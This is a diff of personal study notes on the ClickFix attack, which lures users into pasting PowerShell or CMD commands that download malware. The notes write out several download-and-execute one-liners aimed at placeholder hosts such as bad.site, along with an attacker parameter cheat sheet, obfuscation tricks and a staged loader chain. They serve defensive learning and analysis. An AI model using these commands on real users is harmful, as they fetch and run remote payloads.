@@ -1,18 +1,19 @@
-ClickFix is a social engineering + script based attack, in which the attackers tricks the victim/users to copy-paste malicious command (usually into Run diagonal/CMD/Powershell/Terminal) that downloads a malware.
+ClickFix:
+  Clickfix is a social engineering + script-based attack, in which the attacker tricks the user to run
+  Malicious commands in (Run dialog/Powershell/Terminal/cmd).
 
-* Instead of exploiting the vulnerabilites in the softeare, attacker makes the user to execute malicious commands themselves, so that the threat actor can bypass the security controls like firewall/email security solutions.
+  Instead of exploiting the softwares, the attacker makes the user to execute commands themselves by 
+  luring them into Fixing something like:
+    -   "Fix your PC"
+    -   "Update browser"
+    -   "Install codec"
+    -   "Captcha verification"
+    -   "Zoom audio fix"
 
-The attackers typical lures the victim as:
-- Fix your PC
-- Update browser
-- Install codec
-- captcha verification
-- Zoom audio fix
+Victim copies command → runs it → malware downloads.
 
-  So Basically, the Attacker/Threat actor tells the user to "FIX" something, so here, FIX is the attack here.
-  Victim copies the command --> runs it --> malware downloads.
+CLICKFIX ATTACK FLOW:
 
-Attack Chain:
 Website / Email lure
         ↓
 Fake instruction "Press Win + R"
@@ -25,25 +26,216 @@ Payload downloaded
         ↓
 Second stage executed
         ↓
-Persistence / C2 connection.
+Persistence / C2 connection
 
-1. Initial Access:
-  Press Windows + R
-  Paste below:
-  powershell -c "iwr http://malicious.site/file.ps1 | iex"                  ==>    Meaning:    Download file.ps1 & execute immediately
-user runs --> Powershell executes.
 
-powershell                          ==> launches powershell
--c ""                               ==> run what ever is there in the "STRINGS" as command
-iwr (Invoke-WebRequest)             ==> Download file
-|                                   ==> Pipe output
-iex                                 ==> invoke-Expression (Execute).
+
+1. Initial Access(User Trick):
+Press Windows + R
+Paste below:
+powershell -c "iwr http://malicious.site/file.ps1 | iex"
+CMD Based Attacks
+certutil -urlcache -split -f http://bad.site/file.exe file.exe
+bitsadmin /transfer job http://bad.site/file.exe C:\Temp\file.exe
+mshta http://bad.site/file.hta
+rundll32.exe url.dll,FileProtocolHandler http://bad.site
+curl http://bad.site/file.exe -o file.exe
+
+Powershell                    ==>    launches powershell
+-c""                          ==>    run as command, that are in the strings
+iwr   (Invoke-WenRequest)     ==>    download file from internet(similar to curl/wget)
+| (Pipe-out)                  ==>    Pipeout ==> Pass output as next input
+iex   (Invoke-Expression)     ==>    Execute, No file on disk
+-OutFile                      ==>    save/writeout
+Start-Process                 ==>    start the process(Execute)
+curl                          ==> sent request or receive response from server
+wget                          ==> Download files
+-w hidden                    ==> hidden window (Run powershell without window)
+-nop                          ==> -NoProfile (Do not load powershell user profile), Runs faster, Avoid security scripts
+-ep bypass                    ==> ExecutionPolicy Bypass(Ignore PS security restrictions, Allow unsigned scripts), Normally windows blocks unknown scripts.
+certutil                      ==> A tool in windows can manage certificate & releated caches.
+-urlcache                     ==> Like CRLs, certificates, or files (Operates on the URL cache)
+-split:                       ==>Splits embedded ASN.1 objects into individual files.
+cmd /c                        ==> Execute command close cmd
+Certutil                      ==> Windows certificate utility(abused to download files)
+-urlcache                      ==> download file from URL
+-split                        ==> split file into chunks
+-f                            ==> Force overwrite
+bitsadmin                     ==> Windows Background downloader
+/transfer                     ==> start download
+mshta                          ==> Executes HTML Applications(Attacker uses JavaScript, VBScript, Downloader).
+rundll32                      ==> used to (open malicious URL, Execute DLL
+-o                            ==> output file
+$env:TEMP                      ==? user app data folder       
+
+
+
+
+Meaning:
+  run powershell - Download "file.ps1" and execute immediately.
 
 2. Stage 1 Loader (Downloader)
   The script usually:
-    Checks sandbox
-    Uses token parameters
-    Downloads second payload
+      Check sandbox.
+      Uses token parameters.
+      Downloads second payload.
+
+$u="http://site/payload.exe"
+Invoke-WebRequest $u -OutFile $env:TEMP\file.exe
+Start-Process $env:TEMP\file.exe
+
+Meaning:
+  Download "file.exe"
+  save it to "TEMP"
+
+3. Stage 2 Payload:
+  This is real malware: Info stealer, RAT, Loader, Cobalt Strike, Lumma, Redline, AsyncRAT
+
+4. Defense Evasion Techniques:
+  ClickFix often uses:
+    a. Obfuscation
+    powershell -enc SQBtAHAA...
+    b. String splitting
+    "po"+"wer"+"shell"
+    c. Environment variables
+     $env:APPDATA
+5.
+Sandbox Evasion:
+  ?token=unused
+Purpose:
+  Only real user gets payload
+  Sandbox blocked
+  One-time download
+
+ClickFix Analysis:
+  1. Identify the Initial Access command.
+      Look for Powershell, cmd, mshta, rundll32, curl, bitsadmin
+      Eg: mshta http://site/file.hta
+  2. Decode if encoded
+      -enc
+      -base64
+  Decode:
+      echo "BASE64 STRING" | base64 -d
+  3. Extract URLs:
+      Find http, https
+      These are payload, C2,Staging.
+  4. Identify Download Method
+      Common ClickFix download commands:
+      Powershell: Invoke-WebRequest(IWR), curl, wget
+      CMD: certutil -urlcache -split -f 
+            bitsadmin /transfer
+        Eg:
+          certutil -urlcache -split -f https://example.com/certfile.cer output.cer
+          -f: Forces overwrite if the file exists.
+        The first argument after -f is the URL to fetch.
+        The last argument is the local file name to save.
+
+certutil -urlcache crl http://ca.example.com/ca.crl -split -f
+How it works: When run with a URL, certutil -urlcache -split -f will:
+Fetch the specified file from the URL (even if cached).
+Save it locally under the given filename.
+If the file contains multiple ASN.1 objects (e.g., certificate chain), it will split them into separate .cer, .crl, or .sst files in the current directory.
+Another Example – Force re-download of a CRL and split:
+
+certutil -urlcache crl http://ca.example.com/ca.crl -split -f
+Copy
+This forces retrieval of the CRL from the CA, overwrites any existing cached copy, and splits it into components.
+
+Important notes:
+Without specifying delete, -urlcache fetches or displays entries; with a URL, it downloads.
+Use certutil -urlcache * delete to clear all cached URLs if needed.
+The -split option is useful for extracting individual certificates from bundles.
+Always ensure you trust the source URL before downloading, as this command will write files directly to disk.
+This combination is often used by administrators for troubleshooting certificate chains or extracting specific certs from downloaded bundles.
+
+
+
+5. Look for Execution
+      Start-Process
+      iex
+      cmd /c
+
+Real ClickFix BreakDown:
+  Eg: powershell -w hidden -nop -c "iwr http://bad.site/a.ps1 | iex"
+
+Part	                                          Meaning
+
+-w hidden	                                      hide window
+-nop	                                          no profile
+iwr	                                            download
+iex	                                            execute
+hidden	                                        stealth
+
+Advanced ClickFix Variants:
+ Variant 1 -  Multi-Stage
+      Run → PS script → HTA → EXE
+Variant 2 - 7Zip portable drop
+    Purpose:
+Extract payload
+avoid AV detection
+
+  Variant 3 - Living off the land (LOL)
+Uses: mshta, regsvr32, rundll32
+
+Mental Model:
+  User trick ==> copy command ==> script download ==> Payload Execute
+
+Eg: powershell -w hidden -nop -ep bypass -c "iwr http://bad.site/payload.ps1 | iex"
+powershell -w hidden -nop -ep bypass -c "iwr http://bad.site/payload.ps1 | iex"
+
+run powershell in hidden window, no user profile to load, bypass Powershell security controls & run "download payload.ps1 & execute immediately"
+
+cmd /c powershell iwr http://bad.site/file.ps1 | iex
+
+
+
+
+
+🧪 Most Important Parameters Cheat Sheet
+Parameter	                Meaning	                                        Why attacker uses
+powershell	              run PowerShell	                                execute script
+-w hidden	                hide                                            window	stealth
+-nop	                    no profile	                                    faster
+-ep bypass	              bypass security	                                run unsigned
+-c	                      run command	                                    execute
+iwr	                      download	                                      payload
+iex	                      execute	                                        run script
+-enc	                    encoded	                                        obfuscation
+certutil	                download	                                      LOLBIN
+bitsadmin	                download	                                      stealth
+mshta	                    execute                                         HTA	script run
+rundll32	                run DLL	                                        payload
+curl	                    download	                                      payload
+wget	                    download	                                      payload
+
+
+
+User runs command
+     ↓
+Stager (Stage 0)   ==> connects to URL, Download script, Executes it.
+     ↓
+Loader (Stage 1)   ==> A Pgm/script that loads the real malware into memory/downloads additional component
+     ↓
+Stage 2 Payload    ==> Intermediate payload that sets up environment before final malware
+     ↓
+Final Payload      ==>The actual malicious tool attacker wants to run.(Eg: Infostealer,ART, Backdoor<Ransomeware, cryptominer).
+     ↓
+C2 / Persistence
+
+
+Stage - 0:
+  powershell -c "iwr http://site/1.ps1 | iex"
+Stage - 1: Loader
+  1.ps1 downloads loader.exe
+Stage - 2: Setup
+  loader.exe downloads payload.dll
+Final Payload
+  payload.dll injected into explorer.exe
+
+  
+  
+
+
 
 
 
